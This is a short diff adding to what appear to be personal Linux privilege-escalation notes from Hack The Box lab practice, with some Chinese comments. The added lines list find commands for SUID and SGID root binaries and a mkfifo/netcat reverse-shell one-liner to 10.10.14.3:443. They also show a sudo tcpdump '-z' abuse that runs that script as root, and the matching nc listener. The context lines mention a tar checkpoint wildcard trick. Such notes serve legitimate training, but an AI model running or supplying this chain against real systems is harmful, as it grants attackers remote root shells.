@@ -85,3 +85,14 @@ echo "" > -- --checkpoint=1
 逃逸shell
   https://vk9-sec.com/linux-restricted-shell-bypass/#google_vignette
 
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null      找 SETUID
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null      找 SETGID
+
+
+htb_student@NIX02:~$ cat /tmp/.test
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+mattchow@htb[/htb]$ nc -lnvp 443
+
+
